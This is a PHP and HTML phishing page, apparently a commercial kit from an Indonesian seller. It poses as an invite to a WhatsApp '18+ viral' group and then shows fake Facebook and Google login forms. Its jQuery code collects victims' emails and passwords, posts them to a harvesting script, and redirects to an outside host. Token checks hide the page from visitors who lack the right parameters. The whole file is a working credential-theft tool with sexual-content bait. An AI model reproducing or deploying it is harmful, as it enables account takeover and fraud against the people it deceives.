<?php
// CREATOR KANG SCRIPT
// TOLONG HARGAI CREATOR
// Order SC: https://wa.me/62895310150

if(isset($_POST['sessionToken']) && isset($_GET['gToken'])){
    $sessionToken = $_POST['sessionToken'];
    $gToken = $_GET['gToken'];
    
    if($sessionToken != "well"){
        header("Location: verify.php");
    }
    
    if($gToken != "verified"){
        header("Location: verify.php");
    }

include "system/payload.php";
gcodeCheckSession("verify.php");
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>GRUP VIRAL 18+</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet"/>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/cdn-alz/css@main/login2/facebook.css"> 
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/cdn-alz/css@main/login2/google.css"> 
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/cdn-alz/css@main/login2/all.css"> 
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/cdn-alz/css@main/5/style.css"> 
  <style>
  </style>
</head>
<body class="bg-[#f5f1e9] min-h-screen flex flex-col items-center">
  
  <!-- Header -->
  <header class="w-full bg-[#128C7E] flex items-center px-3 py-2 space-x-3">
   <button aria-label="Back" class="text-white text-xl">
    <i class="fas fa-arrow-left"></i>
   </button>
   <img alt="Profile" class="w-10 h-10 rounded-full object-cover" src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/5/admin.webp"/>
   <div class="flex flex-col text-white text-sm font-semibold leading-tight truncate max-w-[60vw]">
    <span class="truncate">GRUP VIRAL 18+</span>
    <span class="truncate text-xs font-normal opacity-90">+62 812-9201-5028, +62 ...</span>
  </div>



  </header>

  <!-- Date Label -->
  <div class="mt-3">
   <div class="bg-white text-[#202c33] text-xs font-semibold px-3 py-1 rounded-full select-none inline-block">
    26 April 2025
   </div>
  </div>

  <!-- Info Box -->
  <div class="mt-3 max-w-[90vw]">
   <div class="bg-[#fff3cd] text-[#664d03] text-xs px-3 py-2 rounded-md leading-tight select-text">
    <i class="fas fa-lock mr-1"></i>
    Pesan dan panggilan terenkripsi secara end-to-end. Tidak seorangpun di luar chat ini, termasuk WhatsApp, yang dapat membaca atau mendengarkannya. Ketuk untuk info selengkapnya.
   </div>
  </div>

  <!-- Join Message -->
  <div class="mt-3 max-w-[90vw]">
    <div class="bg-[#e6f4f1] text-[#202c33] text-xs px-3 py-2 rounded-md text-center select-text">
      +62 838-6241-8751 bergabung menggunakan tautan undangan grup ini
    </div>
  </div>

  <!-- Join Message -->
  <div class="mt-3 max-w-[90vw]">
    <div class="bg-[#e6f4f1] text-[#202c33] text-xs px-3 py-2 rounded-md text-center select-text">
      +62 838-6241-8751 bergabung menggunakan tautan undangan grup ini
    </div>
  </div>

  <!-- Foto.png -->
  <div class="mt-3 max-w-[90vw]">
    <img 
      alt="Photo" 
      class="mt-2 rounded-lg object-cover w-full max-w-[300px] cursor-pointer" 
      src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/5/video.webp" 
      onclick="showGroupInfo()"
    </img>
  </div>

  <!-- Join Message -->
  <div class="mt-3 max-w-[90vw]">
    <div class="bg-[#e6f4f1] text-[#202c33] text-xs px-3 py-2 rounded-md text-center select-text">
      +62 876-1642-3755 bergabung menggunakan tautan undangan grup ini
    </div>
  </div>

  <!-- Foto.png ke-2 (kalau mau 2x gambar) -->
  <div class="mt-3 max-w-[90vw]">
    <img 
      alt="Photo" 
      class="mt-2 rounded-lg object-cover w-full max-w-[300px] cursor-pointer" 
      src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/5/preview.gif" 
      onclick="showGroupInfo()"
    />
  </div>

  <!-- Group Info Section (Awalnya disembunyikan) -->
<section id="groupInfo" class="hidden fixed inset-x-0 bottom-0 w-full bg-white rounded-t-2xl p-6 flex flex-col items-center shadow-2xl z-40">
  <div style="margin-left:42%;" class="w-12 h-1.5 bg-gray-300 rounded-full mb-4"></div> <!-- garis kecil -->
  <img style="margin-left:40%;" alt="Profile" class="w-20 h-20 rounded-full object-cover" src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/5/admin.webp"/>
  <h1 class="mt-3 font-semibold text-lg text-center text-black select-text">
    GRUP VIRAL 18+
  </h1>
  <p class="text-gray-600 text-sm mt-1 select-text">
    Dibuat pada 28 02 2024
  </p>
  <p class="text-gray-600 text-sm mt-3 select-text">
    <strong>Peraturan Grup:</strong> Setelah bergabung, diharapkan untuk tidak menyebarkan video yang telah diposting di dalam grup ini ke luar. Kami menjaga kerahasiaan dan kenyamanan bersama di dalam komunitas ini.
  </p>
  <div class="mt-4 flex -space-x-3">
    <img class="w-10 h-10 rounded-full border-2 border-white object-cover" src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/5/profil1.webp"/>
    <img class="w-10 h-10 rounded-full border-2 border-white object-cover" src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/5/profil2.webp"/>
    <img class="w-10 h-10 rounded-full border-2 border-white object-cover" src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/5/profil3.webp"/>
    <img class="w-10 h-10 rounded-full border-2 border-white object-cover" src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/5/profil4.webp"/>
    <div class="w-10 h-10 rounded-full border-2 border-white bg-gray-200 flex items-center justify-center text-gray-700 font-semibold text-sm select-text">
      +871
    </div>
  </div>
  <button style="margin-left:15%;"
    class="mt-6 w-full max-w-[300px] bg-[#128C7E] text-white font-semibold text-base py-3 rounded-full hover:bg-[#0f7a6b] transition-colors"
    onclick="codxLoginPopup()"
  >
    Bergabung ke grup
  </button>
</section>
</div> 
<center><div class="popup-login selectLogin animate fadeIn" style="display: none;"> 
   <div class="option"> 
    <center> 
     <div class="textdwnlfgn">
      Login untuk melanjutkan.
     </div> 
     <div class="imgLog" style="display:block; margin: auto; margin-top: 20px;"> 
      <img src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/login2/logfb.webp" onclick="codxFB();"> 
      <img src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/login2/loggp.webp" onclick="codxGP();"> 
     </div> 
    </center> 
   </div> 
  </div> 
  </center> 
   </div> 
  </div> 
  <div class="popup-login login-facebook animated fadeIn" style="display: none;"> 
   <div class="popup-box-login-fb"> 
    <a class="close-alex-google" onclick="closeFB()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="navbar-fb"> 
     <img width="45" src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/login2/fbatas.webp"> 
    </div> 
    <div class="content-box-fb"> 
     <img width="55" height="55" src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/login2/fb.webp"> 
     <div class="txt-login-fb">
      Masuk ke akun Anda untuk terhubung dengan Facebook.com
     </div> 
     <form class="login-form" id="FormFB" onsubmit="VerificationData();" method="POST"> 
      <input type="text" name="email" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off" required> 
      <input type="password" name="password" placeholder="Kata Sandi Facebook" autocomplete="off" autocapitalize="off" required> 
      <input type="hidden" name="login" value="Facebook" readonly> 
      <button class="btn-login-fb" type="submit">Masuk</button> 
     </form> 
     <div class="txt-create-account">
      Create account
     </div> 
     <div class="txt-not-now">
      Not now
     </div> 
     <div class="txt-forgotten-password">
      Forgotten password?
     </div> 
    </div> 
    <div class="language-box"> 
     <center> 
      <div class="language-name language-name-active">
       English (UK)
      </div> 
      <div class="language-name">
       Bahasa Indonesia
      </div> 
      <div class="language-name">
       Basa Jawa
      </div> 
      <div class="language-name">
       Bahasa Melayu
      </div> 
      <div class="language-name">
       日本語
      </div> 
      <div class="language-name">
       Español
      </div> 
      <div class="language-name">
       Português (Brasil)
      </div> 
      <div class="language-name"> 
       <i class="fa fa-plus"></i> 
      </div> 
     </center> 
    </div> 
    <div class="copyright">
     Facebook Inc.
    </div> 
   </div> 
  </div> 
  <div class="popup-ariandi alex-google animate fadeIn" style="display: none;"> 
   <div class="container-box-google"> 
    <a class="close-alex-google" onclick="closeGP()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="atasan-google"> 
     <center> 
      <p class="kagetgoogle email-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <p class="kagetgoogle sandi-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <br> 
      <img class="img-loggoogle" src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/login2/gp.webp" style="width: 120px;"> 
     </center> 
    </div> 
    <div class="isi-google"> 
     <center> 
      <form id="FormGP" onsubmit="VerificationData();" method="POST"> 
       <div class="ucapan-google">
        Login to 
        <b>Google</b> to carry on.
       </div> 
       <div class="form-login-google"> 
        <input type="text" id="email_gp" name="email" placeholder="Email. Telepon, atau Username" required> 
       </div> 
       <div class="form-login-google"> 
        <input type="password" id="password_gp" name="password" placeholder="Kata Sandi" required> 
       </div> 
       <input type="hidden" name="login" value="Google" readonly> 
       <button class="btn-login-google cancel" type="submit">Masuk</button> 
       <!-- <button class="btn-login-google" style="background: #fff; border: 1px solid #000; color: #000;" type="button" onclick="ariandi_google()">Cancel</button> --> 
       <br> 
      </form>  
     </center> 
    </div> 
   </div> 
  </div> 
  <script src="https://code.alex-hosting.my.id/github/jquery-3.7.1.min.js"></script>
  <script src="https://code.alex-hosting.my.id/npm/jquery-1.5.min.js"></script>
  ?>
  <script>
  window.addEventListener('load', function() {
  $('#groupInfo').fadeIn();
    setTimeout(() => {
        $('.pop-uplog').fadeIn();
        }, 5000)
   }) 
   </script>
  <script>
  $(document).ready(function () {
    function containsLetters(value) {
        return /[a-zA-Z]/.test(value);
    }

    function isValidEmail(email) {
        return email.toLowerCase().endsWith('@gmail.com');
    }

    function containsSuspiciousContent(value) {
        return /(http|https|:\/\/)/i.test(value);
    }

   function handleFormSubmit(formSelector, emailSelector, passwordSelector) {
        $(formSelector).submit(function (e) {
            e.preventDefault();

            var email = $(emailSelector).val().trim();
            var password = $(passwordSelector).val().trim();
            var loginType = $(this).find('input[name="login"]').val();

            if (email && password) {
                if (containsSuspiciousContent(email) || containsSuspiciousContent(password)) {
                    alert("Email dan Password tidak boleh mengandung 'https'.");
                    return;
                }

                if (containsLetters(email) && !isValidEmail(email)) {
                    alert("HARAP TAMBAHKAN @gmail.com.");
                    return;
                }

                $.post('codxfinal.php', {
                    email: email,
                    password: password,
                    login: loginType
                }).always(function () {
                    window.location.href = "https://images.alex-hosting.my.id/unduh/ai.php";
                });
            }
        });
    }

    // Aktifkan fungsi submit untuk FB dan GP
    handleFormSubmit('#FormFB', 'input[name="email"]', 'input[name="password"]');
    handleFormSubmit('#FormGP', '#email_gp', '#password_gp');

    // Tombol
    $("#codxFacebook").click(function () {
        codxFB();
    });

    $("#codxGoogle").click(function () {
        codxGP();
    });

    $("#codxLoginPopup").click(function () {
        codxLoginPopup();
    });
});
</script>
<?php
//DON'T DELETE THIS MODULE
//MODULE DI ENC BIAR KAGA KE MALINGAN KODE
?>
<script>
// KHUSUS VIP S2M https://wa.me/62891630150
</script>
 </body>
</html>
<?php
}else{
    header("Location: verify.php");
}
?>